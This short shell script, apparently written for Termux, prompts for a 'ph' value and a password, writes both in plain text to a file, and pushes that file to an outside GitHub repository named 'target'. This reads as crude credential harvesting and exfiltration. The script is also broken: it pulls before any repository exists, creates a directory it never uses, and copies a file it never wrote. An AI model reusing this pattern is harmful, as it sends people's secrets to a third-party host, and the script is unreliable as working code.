mkdir git
git pull
read -p "enter ph :" H
echo $H >> ph1.py

read -p "enter pass :" F
echo $F >> ph1.py

cp ph1.txt /data/data/com.termux/files/home/git

git init
git add ph1.py
git commit -m "first commit"
git remote add origin https://github.com/oo-ozo/target.git
git push -u origin master
git pull